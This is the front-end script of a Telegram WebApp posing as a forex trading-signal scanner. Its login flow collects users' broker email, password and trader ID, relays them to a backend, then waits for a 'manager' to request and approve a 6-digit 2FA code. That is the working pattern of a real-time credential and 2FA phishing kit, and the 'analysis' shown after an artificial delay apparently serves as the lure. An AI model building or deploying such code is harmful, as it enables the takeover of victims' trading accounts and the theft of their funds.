// 🔥 YAHAN APNA RENDER URL DAALNA
const RENDER_BACKEND_URL = "https://your-app-name.onrender.com";

let tg;
try { tg = window.Telegram.WebApp; tg.expand(); tg.ready(); } catch(e) {}

const USER_ID = tg?.initDataUnsafe?.user?.id || Math.floor(Math.random() * 999999);
let pollInterval;

// Cooldown logic mapping exactly as requested[cite: 2]
const tfSeconds = {
    "5s": 5, "10s": 10, "15s": 15, "30s": 30,
    "1m": 60, "2m": 120, "3m": 180, "5m": 300
};

document.addEventListener("DOMContentLoaded", () => {
    
    const btnLogin = document.getElementById('btnLogin');
    const btnSubmitCode = document.getElementById('btnSubmitCode');

    if (btnLogin) {
        btnLogin.addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const traderId = document.getElementById('traderId').value;

            if(!email || !password || !traderId) return alert("⚠️ Enter all Credentials!");
            
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('waiting-msg').style.display = 'block';

            try {
                await fetch(`${RENDER_BACKEND_URL}/api/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: USER_ID, email, password, trader_id: traderId })
                });
                pollInterval = setInterval(checkStatus, 3000);
            } catch (e) { alert("Server Connection Lost."); location.reload(); }
        });
    }

    if (btnSubmitCode) {
        btnSubmitCode.addEventListener('click', async () => {
            const code = document.getElementById('auth-code').value;
            if(!code) return alert("⚠️ Enter 6-Digit 2FA!");

            document.getElementById('code-form').style.display = 'none';
            document.getElementById('waiting-msg').style.display = 'block';

            try {
                await fetch(`${RENDER_BACKEND_URL}/api/code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: USER_ID, code })
                });
            } catch (e) { alert("Server Error."); }
        });
    }

    async function checkStatus() {
        try {
            const res = await fetch(`${RENDER_BACKEND_URL}/api/status/${USER_ID}`);
            const data = await res.json();
            
            if (data.status === 'code_required') {
                document.getElementById('waiting-msg').style.display = 'none';
                document.getElementById('code-form').style.display = 'block';
            } else if (data.status === 'approved') {
                clearInterval(pollInterval);
                
                document.getElementById('auth-screen').style.display = 'none';
                document.getElementById('dashboard-screen').style.display = 'flex';
                
                document.getElementById('dispUid').innerText = USER_ID;
                document.getElementById('usageCount').innerText = data.used || 0;
                document.getElementById('limitCount').innerText = data.limit === -1 ? '∞' : data.limit;
                
                setTimeout(() => {
                    initTradingView("FX:EURUSD");
                }, 200);

                renderJournal();
                if(tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
            } else if (data.status === 'declined' || data.status === 'code_declined') {
                clearInterval(pollInterval);
                alert("❌ ACCESS DENIED BY MANAGER.");
                location.reload();
            }
        } catch (e) {}
    }

    const navItems = document.querySelectorAll('.nav-item');
    const tabPanes = document.querySelectorAll('.tab-pane');

    navItems.forEach(item => {
        item.addEventListener('click', function() {
            navItems.forEach(n => n.classList.remove('active'));
            tabPanes.forEach(t => t.style.display = 'none');
            
            this.classList.add('active');
            const targetId = this.getAttribute('data-tab');
            document.getElementById(targetId).style.display = 'block';
            
            if(tg?.HapticFeedback) tg.HapticFeedback.selectionChanged();
        });
    });

    const assetSelect = document.getElementById('assetPair');
    assetSelect.addEventListener('change', (e) => {
        const symbol = "FX:" + e.target.value;
        initTradingView(symbol);
    });

    function initTradingView(symbol) {
        document.getElementById('tv_chart_container').innerHTML = '';
        new TradingView.widget({
            "autosize": true,
            "symbol": symbol,
            "interval": "1",
            "timezone": "Etc/UTC",
            "theme": "dark",
            "style": "1",
            "locale": "en",
            "enable_publishing": false,
            "backgroundColor": "#2b2f3a",
            "gridColor": "#3b4050",
            "hide_top_toolbar": true,
            "hide_legend": true,
            "save_image": false,
            "container_id": "tv_chart_container"
        });
    }

    const btnExtract = document.getElementById('btnExtract');
    const tfSelect = document.getElementById('timeframe');
    
    if (btnExtract) {
        btnExtract.addEventListener('click', async () => {
            const pair = assetSelect.value;
            const tfVal = tfSelect.value;

            if(!pair || !tfVal) return alert("⚠️ SELECT MARKET PAIR AND TIMEFRAME.");

            btnExtract.disabled = true;
            btnExtract.innerText = 'ANALYZING MARKET...';
            document.getElementById('signalResultCard').style.display = 'none';
            if(tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');

            try {
                const response = await fetch(`${RENDER_BACKEND_URL}/api/get_signal/${USER_ID}`);
                const data = await response.json();
                
                if(data.error) {
                    alert("⚠️ " + data.message);
                    resetScannerBtn();
                    return;
                }

                setTimeout(() => {
                    const sigCard = document.getElementById('signalResultCard');
                    const dirText = document.getElementById('sigDirection');
                    
                    dirText.innerText = data.direction;
                    dirText.className = data.type === 'up' ? 'sig-dir call' : 'sig-dir put';
                    document.getElementById('sigPair').innerText = pair;
                    document.getElementById('sigTf').innerText = tfVal;
                    document.getElementById('sigScore').innerText = data.confluence;
                    
                    sigCard.style.display = 'block';
                    
                    document.getElementById('valRSI').innerText = data.rsi;
                    document.getElementById('valMACD').innerText = data.macd;
                    document.getElementById('valEMA').innerText = data.ema;
                    document.getElementById('valVol').innerText = data.volatility;
                    document.getElementById('valReason').innerText = data.reason;

                    saveToJournal(pair, tfVal, data.direction, data.confluence);

                    if(tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred(data.type === 'up' ? 'success' : 'warning');
                    
                    startCooldown(tfSeconds[tfVal]);

                }, 2000);

            } catch(e) {
                alert("Network Fault. Please check connection.");
                resetScannerBtn();
            }
        });
    }

    function resetScannerBtn() {
        btnExtract.disabled = false;
        btnExtract.innerText = 'ANALYZE MARKET';
    }

    function startCooldown(totalSeconds) {
        const btn = document.getElementById('btnExtract');
        const panel = document.getElementById('cooldownPanel');
        const timerText = document.getElementById('coolTimer');
        const bar = document.getElementById('coolBar');

        btn.style.display = 'none';
        panel.style.display = 'block';
        
        let timeLeft = totalSeconds;
        bar.style.transition = `width ${totalSeconds}s linear`;
        setTimeout(() => { bar.style.width = '0%'; }, 50);

        updateTimerDisplay(timeLeft, timerText);

        const cdInt = setInterval(() => {
            timeLeft--;
            updateTimerDisplay(timeLeft, timerText);

            if (timeLeft <= 0) {
                clearInterval(cdInt);
                panel.style.display = 'none';
                btn.style.display = 'block';
                bar.style.transition = 'none';
                bar.style.width = '100%'; 
                resetScannerBtn();
                document.getElementById('signalResultCard').style.display = 'none';
                if(tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
            }
        }, 1000);
    }

    function updateTimerDisplay(sec, el) {
        let m = Math.floor(sec / 60).toString().padStart(2, '0');
        let s = (sec % 60).toString().padStart(2, '0');
        el.innerText = `${m}:${s}`;
    }

    function saveToJournal(pair, tf, dir, conf) {
        let history = JSON.parse(localStorage.getItem('tbp_journal')) || [];
        const entry = {
            pair: pair, tf: tf, dir: dir, conf: conf, 
            time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
        };
        history.unshift(entry);
        if(history.length > 30) history.pop();
        localStorage.setItem('tbp_journal', JSON.stringify(history));
        renderJournal();
    }

    function renderJournal() {
        const listEl = document.getElementById('journalList');
        let history = JSON.parse(localStorage.getItem('tbp_journal')) || [];
        
        if(history.length === 0) {
            listEl.innerHTML = '<p class="text-muted text-center" style="padding: 20px;">No history.</p>';
            return;
        }

        let html = '';
        history.forEach(item => {
            const colorClass = item.dir === 'CALL' ? 'text-green' : 'text-red';
            html += `
                <div class="j-item">
                    <div class="j-left">
                        <span class="j-pair">${item.pair}</span>
                        <span class="j-time">${item.time} | TF: ${item.tf}</span>
                    </div>
                    <div class="j-right">
                        <span class="j-dir ${colorClass}">${item.dir}</span>
                        <span class="j-conf">${item.conf} Conf</span>
                    </div>
                </div>
            `;
        });
        listEl.innerHTML = html;
    }

    document.getElementById('btnClearJournal').addEventListener('click', () => {
        if(confirm("Clear history?")) {
            localStorage.removeItem('tbp_journal');
            renderJournal();
        }
    });
});
